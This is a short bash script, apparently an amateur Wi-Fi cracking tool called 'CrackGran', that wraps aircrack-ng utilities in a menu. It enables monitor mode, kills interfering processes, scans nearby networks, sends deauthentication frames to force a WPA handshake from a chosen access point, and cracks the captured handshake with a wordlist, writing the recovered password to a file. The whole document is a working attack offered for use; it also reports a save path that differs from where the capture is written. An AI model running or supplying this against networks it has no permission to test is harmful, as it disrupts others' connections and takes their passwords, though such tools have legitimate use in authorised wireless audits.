#!/bin/bash

#################### CrackGran v1 #####################
			


#Copyright by snom (C) 2020   



# select wireless card for monitor mod
read -p 'select your monitor  ' myMonitor

airmon-ng start $myMonitor  # active  monitor mod

# echo the availible options 
echo '[1] wireless locat'
echo '[2] wireless attack'
echo '[3] crack handshake '
echo '[4] exit  '
##
read -p 'select >> ' optionSelect

# selected options case
case $optionSelect in 

  1)
    
        # this case for locat wirles
	airmon-ng check kill # kill prouceses
	sleep 2
	airodump-ng "${myMonitor}mon" # finde  wirles
	;;

  2)

        # this case for get handshake 
	airmon-ng check kill # kill prouceses
    	# inputs
	read -p 'BSSID > ' bssid
	read -p 'chenal > ' chenal
	read -p 'fill name > ' fillName

  	    # using airepla with airodump tool to take handshakes
    aireplay-ng --deauth 10 -a $bssid $myMonitor'mon' 
	airodump-ng $myMonitor'mon' -w /CrackGram/$fillName -c $chenal --bssid $bssid # take a handshak in a spesifec network
	echo "handshake fill  ~/Desktop/handshakes/$fillName"
	airmon-ng stop "${myMonitor}mon"  # close  monitor mod
	;;

  3)
        
        # this case for extract password in .cap file 
	    # inputs
	read -p 'word list > ' wordList 
	read -p 'handshakes fill > ' handshakesFill 
    aircrack-ng -w $wordList $handshakesFill -l wifipass.txt&
    # -l for past wifi password in file
    ;;

  4)
        # this case for killing the process 
    airmon-ng stop "${myMonitor}mon" # close  monitor mod
	exit
	;;

esac

